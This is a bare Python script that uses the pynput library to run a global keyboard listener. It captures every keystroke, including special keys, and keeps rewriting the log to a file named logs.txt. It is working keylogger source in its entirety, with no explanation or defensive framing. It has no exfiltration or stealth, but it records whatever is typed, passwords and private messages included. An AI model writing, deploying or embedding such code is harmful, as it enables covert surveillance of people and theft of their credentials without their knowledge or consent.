from pynput import keyboard
log = ""
def keys_pressing(key):
        global log
        try:
            log  = log + str(key.char )
        except AttributeError :
            if key == key.space:
                key =" "
            log = log + " " + str(key) + " "
        with open('logs.txt' , 'w') as keysfile:
            keysfile.write(log)

loger = keyboard.Listener(on_press=keys_pressing)
with loger:
    loger.join()


